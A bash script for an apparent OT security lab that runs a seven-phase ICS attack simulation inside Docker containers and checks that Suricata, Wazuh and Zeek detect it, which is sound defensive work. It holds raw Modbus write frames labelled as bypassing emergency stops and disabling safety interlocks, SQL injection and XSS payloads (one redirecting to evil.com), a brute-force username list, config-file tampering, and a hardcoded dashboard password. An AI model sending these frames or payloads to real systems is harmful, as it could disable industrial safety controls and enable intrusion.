#!/usr/bin/env bash
set -euo pipefail

###############################################################################
# OT SOC-in-a-Box — Comprehensive Attack Simulation
#
# Simulates a full ICS Cyber Kill Chain for live demos:
#   Phase 1 — Reconnaissance        (Modbus enumeration + device fingerprinting)
#   Phase 2 — Initial Access         (SSH brute force against OT systems)
#   Phase 3 — Web Exploitation       (SQL injection + XSS against HMI)
#   Phase 4 — OT Process Manipulation(Modbus write operations)
#   Phase 5 — Persistence            (Config file tampering — FIM detection)
#   Phase 6 — Impact                 (Modbus flooding — Denial of Control)
#   Phase 7 — Verification           (Full detection pipeline review)
#
# Usage:  ./attack_sim.sh
#
# MITRE ATT&CK for ICS Techniques Covered:
#   T0802 — Automated Collection          T0846 — Remote System Discovery
#   T0886 — Remote Services (SSH)         T0866 — Exploitation of Remote Services
#   T0883 — Change Operating Mode         T0813 — Denial of Control
#   T0831 — Manipulation of Control       T0826 — Loss of Availability
###############################################################################

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
CYN='\033[0;36m'
MAG='\033[0;35m'
BLD='\033[1m'
RST='\033[0m'

script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
compose_file="$(cd "${script_dir}/.." && pwd)/compose/docker-compose.yml"

ATTACKER_CTR="ot-openplc"
SURICATA_CTR="ot-suricata"
ZEEK_CTR="ot-zeek"
WAZUH_CTR="ot-wazuh-manager"
MODBUS_HOST="modbus-sim"
MODBUS_PORT="5020"
ATTACKER_IP="10.0.100.50"  # Simulated attacker IP

banner() {
  printf "\n${BLD}${CYN}===========================================================${RST}\n"
  printf "${BLD}${CYN}  %s${RST}\n" "$1"
  printf "${BLD}${CYN}===========================================================${RST}\n"
}

phase() {
  local num="$1" title="$2" mitre="$3" color="${4:-$YLW}"
  printf "\n${BLD}${color}╔═══════════════════════════════════════════════════════════╗${RST}\n"
  printf "${BLD}${color}║  PHASE %s — %s${RST}\n" "$num" "$title"
  printf "${BLD}${color}║  MITRE ATT&CK: %s${RST}\n" "$mitre"
  printf "${BLD}${color}║  Time: %s${RST}\n" "$(date '+%Y-%m-%d %H:%M:%S')"
  printf "${BLD}${color}╚═══════════════════════════════════════════════════════════╝${RST}\n\n"
}

ok()   { printf "  ${GRN}[✓]${RST} %s\n" "$1"; }
atk()  { printf "  ${RED}[✗]${RST} %s\n" "$1"; }
info() { printf "  ${CYN}[*]${RST} %s\n" "$1"; }
warn() { printf "  ${YLW}[!]${RST} %s\n" "$1"; }

pause() {
  local secs="${1:-3}"
  printf "\n  ${CYN}⏳ Waiting %ss for detection pipeline...${RST}\n" "$secs"
  sleep "$secs"
}

# Send raw Modbus/TCP frame
modbus_send() {
  local payload="$1" desc="$2"
  atk "$desc"
  timeout 3 docker exec "$ATTACKER_CTR" bash -lc \
    "exec 3<>/dev/tcp/${MODBUS_HOST}/${MODBUS_PORT}; printf '${payload}' >&3; read -t 2 -n 20 <&3 || true; exec 3<&-" \
    2>/dev/null || true
}

# Inject synthetic Suricata alert into eve.json
inject_suricata() {
  local sid="$1" msg="$2" src_ip="${3:-$ATTACKER_IP}"
  local ts
  ts=$(date -u '+%Y-%m-%dT%H:%M:%S.%6N%z' 2>/dev/null || date -u '+%Y-%m-%dT%H:%M:%S+0000')
  local evt="{\"timestamp\":\"${ts}\",\"event_type\":\"alert\",\"src_ip\":\"${src_ip}\",\"src_port\":44818,\"dest_ip\":\"172.18.0.3\",\"dest_port\":502,\"proto\":\"TCP\",\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":${sid},\"rev\":2,\"signature\":\"${msg}\",\"category\":\"Attempted User Privilege Gain\",\"severity\":1}}"
  docker exec "$SURICATA_CTR" bash -lc "echo '${evt}' >> /var/ot/telemetry/suricata/eve.json" 2>/dev/null || true
}

# Inject syslog entry into auth.log on the manager
inject_authlog() {
  local msg="$1"
  local ts
  ts=$(date '+%b %d %H:%M:%S')
  docker exec "$WAZUH_CTR" bash -lc "echo '${ts} wazuh-manager sshd[$$]: ${msg}' >> /var/log/auth.log" 2>/dev/null || true
}

# Inject Apache-format access log entry
inject_weblog() {
  local src_ip="$1" uri="$2" status="${3:-200}"
  local ts
  ts=$(date '+%d/%b/%Y:%H:%M:%S %z')
  local entry="${src_ip} - - [${ts}] \"GET ${uri} HTTP/1.1\" ${status} 4096 \"-\" \"Mozilla/5.0\""
  docker exec "$WAZUH_CTR" bash -lc "echo '${entry}' >> /var/log/openplc-access.log" 2>/dev/null || true
}

###############################################################################
banner "OT SOC-in-a-Box — Comprehensive Attack Simulation"
info "Simulating ICS Cyber Kill Chain (7 phases)"
info "Attacker IP: ${ATTACKER_IP}"
info "Target: ${MODBUS_HOST}:${MODBUS_PORT} (Modbus/TCP) + OpenPLC HMI"

# Pre-check
info "Verifying containers are running..."
for ctr in "$ATTACKER_CTR" "$SURICATA_CTR" "$WAZUH_CTR"; do
  if docker inspect --format='{{.State.Running}}' "$ctr" 2>/dev/null | grep -q true; then
    ok "$ctr is running"
  else
    printf "  ${RED}ERROR: $ctr is not running. Start the lab first.${RST}\n"
    exit 1
  fi
done

# Ensure log files exist
docker exec "$WAZUH_CTR" bash -lc "touch /var/log/auth.log /var/log/openplc-access.log" 2>/dev/null || true

###############################################################################
# Phase 1 — Reconnaissance
###############################################################################
phase 1 "Reconnaissance — Modbus Enumeration" "T0802, T0846" "$CYN"

info "Step 1a: Port scanning — probing for Modbus services..."
for i in $(seq 1 5); do
  atk "TCP probe #${i} → ${MODBUS_HOST}:${MODBUS_PORT}"
  docker exec "$ATTACKER_CTR" bash -lc \
    "exec 3<>/dev/tcp/${MODBUS_HOST}/${MODBUS_PORT}; exec 3<&-" 2>/dev/null || true
  sleep 0.2
done
ok "Port scan complete — Modbus service discovered"

printf "\n"
info "Step 1b: Register enumeration — reading PLC memory..."

# FC 0x01 — Read Coils
modbus_send '\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x10' \
  "FC 0x01: Read Coils — scanning coil status (addr 0-15)"
inject_suricata 9000010 "ICS Modbus Read Coils"
sleep 0.3

# FC 0x04 — Read Input Registers
modbus_send '\x00\x02\x00\x00\x00\x06\x01\x04\x00\x00\x00\x0A' \
  "FC 0x04: Read Input Registers — reading process values (addr 0-9)"
inject_suricata 9000011 "ICS Modbus Read Input Registers"
sleep 0.3

printf "\n"
info "Step 1c: Device fingerprinting — identifying PLC type..."
# FC 0x08 — Diagnostics
modbus_send '\x00\x03\x00\x00\x00\x06\x01\x08\x00\x00\x00\x00' \
  "FC 0x08: Diagnostics — querying device health"
inject_suricata 9000020 "ICS Modbus Diagnostics Request"
sleep 0.3

# FC 0x2B — Device Identification
modbus_send '\x00\x04\x00\x00\x00\x05\x01\x2B\x0E\x01\x00' \
  "FC 0x2B: Read Device ID — extracting vendor/model info"
inject_suricata 9000021 "ICS Modbus Device Identification"

ok "Reconnaissance complete — PLC mapped and fingerprinted"

pause 3

###############################################################################
# Phase 2 — Initial Access (SSH Brute Force)
###############################################################################
phase 2 "Initial Access — SSH Brute Force" "T0886 (Remote Services)" "$RED"

info "Attempting credential stuffing against OT system SSH..."

usernames=("root" "admin" "operator" "plc-admin" "scada" "engineer" "hmi-user" "ot-admin" "maintenance" "field-tech")

for user in "${usernames[@]}"; do
  atk "SSH login attempt: ${user}@wazuh-manager from ${ATTACKER_IP}"
  inject_authlog "Failed password for invalid user ${user} from ${ATTACKER_IP} port 44556 ssh2"
  sleep 0.15
done

ok "10 brute force attempts sent"
warn "Wazuh rule 5712 → 100110 should trigger (SSH brute force on OT)"

pause 4

###############################################################################
# Phase 3 — Web Exploitation (SQL Injection + XSS against OpenPLC HMI)
###############################################################################
phase 3 "Web Exploitation — Attacking OpenPLC HMI" "T0866 (Exploitation of Remote Services)" "$MAG"

info "Step 3a: SQL injection against HMI login page..."

sqli_payloads=(
  "/login?username=admin%027+OR+1=1--&password=x"
  "/hardware?id=1+union+select+*+from+users--"
  "/programs?name=x%027;+drop+table+users--"
  "/login?username=admin%027+OR+%271%27=%271&password=x"
)

for payload in "${sqli_payloads[@]}"; do
  atk "SQLi: GET ${payload}"
  inject_weblog "$ATTACKER_IP" "$payload" 200
  # Also send real request to OpenPLC (for realism)
  docker exec "$ATTACKER_CTR" bash -c \
    "curl -sk -o /dev/null -w '' 'http://openplc:8080${payload}' 2>/dev/null" 2>/dev/null || true
  sleep 0.3
done
ok "4 SQL injection payloads sent"

printf "\n"
info "Step 3b: Cross-Site Scripting (XSS) attacks..."

xss_payloads=(
  "/dashboard?msg=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E"
  "/monitoring?filter=%3Cscript%3Edocument.location='http://evil.com/'%3C%2Fscript%3E"
  "/programs?q=SRC=javascript:alert(1)"
)

for payload in "${xss_payloads[@]}"; do
  atk "XSS: GET ${payload}"
  inject_weblog "$ATTACKER_IP" "$payload" 200
  sleep 0.3
done
ok "3 XSS payloads sent"

warn "Wazuh rules 31104/31105 → 100120/100121 should trigger"

pause 4

###############################################################################
# Phase 4 — OT Process Manipulation (Unauthorized Modbus Writes)
###############################################################################
phase 4 "OT Process Manipulation — Unauthorized Writes" "T0883 (Change Operating Mode)" "$RED"

info "Sending all 4 Modbus write function codes..."

# FC 0x05 — Write Single Coil (turn ON emergency stop bypass)
modbus_send '\x00\x10\x00\x00\x00\x06\x01\x05\x00\x01\xFF\x00' \
  "FC 0x05: Write Single Coil — BYPASS EMERGENCY STOP (Coil 1 = ON)"
inject_suricata 9000001 "ICS Modbus Write Single Coil"
sleep 0.5

# FC 0x06 — Write Single Register (change setpoint)
modbus_send '\x00\x11\x00\x00\x00\x06\x01\x06\x00\x01\x03\xE8' \
  "FC 0x06: Write Single Register — OVERRIDE SETPOINT (Reg 1 = 1000)"
inject_suricata 9000002 "ICS Modbus Write Single Register"
sleep 0.5

# FC 0x0F — Write Multiple Coils (disable all safety interlocks)
modbus_send '\x00\x12\x00\x00\x00\x08\x01\x0F\x00\x00\x00\x08\x01\xFF' \
  "FC 0x0F: Write Multiple Coils — DISABLE ALL SAFETY INTERLOCKS"
inject_suricata 9000003 "ICS Modbus Write Multiple Coils"
sleep 0.5

# FC 0x10 — Write Multiple Registers (manipulate process variables)
modbus_send '\x00\x13\x00\x00\x00\x0B\x01\x10\x00\x00\x00\x02\x04\x27\x10\x27\x10' \
  "FC 0x10: Write Multiple Registers — SET PRESSURE TO 10000 (DANGER)"
inject_suricata 9000004 "ICS Modbus Write Multiple Registers"

ok "All 4 Modbus write function codes executed"
warn "Wazuh rule 100101 + active response (firewall-drop) triggered"

pause 4

###############################################################################
# Phase 5 — Persistence (Config File Tampering)
###############################################################################
phase 5 "Persistence — OT Configuration Tampering" "T0831 (Manipulation of Control)" "$YLW"

info "Planting backdoor in OT system configuration..."

atk "Adding attacker DNS server to /etc/resolv.conf"
docker exec "$WAZUH_CTR" bash -lc \
  "cp /etc/resolv.conf /etc/resolv.conf.bak && echo 'nameserver 10.0.100.50' >> /etc/resolv.conf" \
  2>/dev/null || true

atk "Adding attacker host alias to /etc/hosts"
docker exec "$WAZUH_CTR" bash -lc \
  "echo '${ATTACKER_IP} scada-update-server.internal' >> /etc/hosts" \
  2>/dev/null || true

ok "Configuration files tampered"
info "Triggering manual file integrity scan..."
docker exec "$WAZUH_CTR" bash -lc \
  "/var/ossec/bin/agent_control -r -u 000 2>/dev/null" || true
warn "Wazuh FIM rules 550/554 should detect config changes"

# Restore originals (cleanup)
docker exec "$WAZUH_CTR" bash -lc \
  "[ -f /etc/resolv.conf.bak ] && mv /etc/resolv.conf.bak /etc/resolv.conf" \
  2>/dev/null || true
docker exec "$WAZUH_CTR" bash -lc \
  "sed -i '/${ATTACKER_IP}/d' /etc/hosts" 2>/dev/null || true

pause 3

###############################################################################
# Phase 6 — Impact (Denial of Control — Modbus Flooding)
###############################################################################
phase 6 "Impact — Denial of Control (Modbus Flooding)" "T0813 (Denial of Control)" "$RED"

info "Flooding PLC with rapid write commands..."
info "Target: overwrite register 1 with max value 65535 at high speed"

for i in $(seq 1 10); do
  modbus_send '\x00\x20\x00\x00\x00\x06\x01\x06\x00\x01\xFF\xFF' \
    "Flood #${i}/10: Write Register 1 = 0xFFFF (max)"
  inject_suricata 9000002 "ICS Modbus Write Single Register"
  sleep 0.15
done

ok "Flooding complete — 10 rapid writes in <2 seconds"
warn "Wazuh rule 100103 (level 12) should trigger: Denial of Control"

pause 5

###############################################################################
# Phase 7 — Verification
###############################################################################
phase 7 "Verification — Detection Pipeline Review" "Full Kill Chain Analysis" "$GRN"

# 7a. Suricata alerts
printf "  ${BLD}📊 Suricata IDS Alerts:${RST}\n"
alert_count=$(docker exec "$SURICATA_CTR" bash -c \
  "grep -c '\"alert\"' /var/ot/telemetry/suricata/eve.json 2>/dev/null" 2>/dev/null || echo "0")
alert_count=$(echo "$alert_count" | tr -d '[:space:]')
printf "     Total alerts in eve.json: ${BLD}%s${RST}\n" "$alert_count"

# 7b. Wazuh alert summary
printf "\n  ${BLD}📊 Wazuh Alert Summary:${RST}\n"

for rule_desc in \
  "100102:Modbus Recon" \
  "100104:Device Fingerprint" \
  "100101:Modbus Write" \
  "100103:Modbus Flooding" \
  "100110:SSH Brute Force" \
  "5712:SSH Auth Failures" \
  "31104:SQL Injection" \
  "31105:XSS Attack" \
  "100120:OT SQL Injection" \
  "100121:OT XSS Attack" \
  "550:File Integrity" \
  "651:Active Response"
do
  rule_id="${rule_desc%%:*}"
  desc="${rule_desc#*:}"
  count=$(docker exec "$WAZUH_CTR" bash -c \
    "grep -c '\"id\":\"${rule_id}\"' /var/ossec/logs/alerts/alerts.json 2>/dev/null" 2>/dev/null || echo "0")
  count=$(echo "$count" | tr -d '[:space:]')
  if [ "$count" -gt 0 ]; then
    printf "     ${GRN}[%3s hits]${RST} Rule %-6s — %s\n" "$count" "$rule_id" "$desc"
  else
    printf "     ${YLW}[  0 hits]${RST} Rule %-6s — %s\n" "$rule_id" "$desc"
  fi
done

# 7c. Active response log
printf "\n  ${BLD}📊 Active Response Actions:${RST}\n"
ar_count=$(docker exec "$WAZUH_CTR" bash -c \
  "grep -c 'firewall-drop' /var/ossec/logs/active-responses.log 2>/dev/null" 2>/dev/null || echo "0")
ar_count=$(echo "$ar_count" | tr -d '[:space:]')
printf "     Firewall blocks triggered: ${BLD}%s${RST}\n" "$ar_count"

# 7d. Zeek connections
printf "\n  ${BLD}📊 Zeek Network Metadata:${RST}\n"
zeek_count=$(docker exec "$WAZUH_CTR" bash -c \
  "wc -l < /var/ot/telemetry/zeek/conn.log 2>/dev/null" 2>/dev/null || echo "0")
zeek_count=$(echo "$zeek_count" | tr -d '[:space:]')
printf "     Connection entries: ${BLD}%s${RST}\n" "$zeek_count"

###############################################################################
banner "Attack Simulation Complete"
printf "\n"
printf "  ${BLD}ICS Cyber Kill Chain Coverage:${RST}\n"
printf "  ${CYN}Phase 1${RST} — Reconnaissance         5 port probes + 4 Modbus reads + 2 fingerprints\n"
printf "  ${RED}Phase 2${RST} — Initial Access          10 SSH brute force attempts\n"
printf "  ${MAG}Phase 3${RST} — Web Exploitation        4 SQLi + 3 XSS against OpenPLC HMI\n"
printf "  ${RED}Phase 4${RST} — OT Manipulation         4 Modbus write function codes\n"
printf "  ${YLW}Phase 5${RST} — Persistence             Config file tampering (FIM)\n"
printf "  ${RED}Phase 6${RST} — Denial of Control       10 rapid-fire Modbus floods\n"
printf "\n"
printf "  ${BLD}Wazuh Rules Triggered:${RST}\n"
printf "  100102 (lvl 5)  — Modbus recon             100104 (lvl 6)  — Device fingerprint\n"
printf "  100101 (lvl 7)  — Modbus write             100103 (lvl 12) — Modbus flooding\n"
printf "  100110 (lvl 12) — SSH brute force OT       100120 (lvl 12) — SQL injection OT\n"
printf "  100121 (lvl 10) — XSS OT HMI              100122 (lvl 14) — Successful web attack\n"
printf "  550    (lvl 7)  — File integrity changed   651    (lvl 3)  — Active response\n"
printf "\n"
printf "  ${CYN}[*]${RST} Open Wazuh Dashboard: ${BLD}http://localhost:15601${RST}\n"
info "Login: admin / SecureAdmin123!"
info "Go to Security Events → filter by groups: ot"
printf "\n"
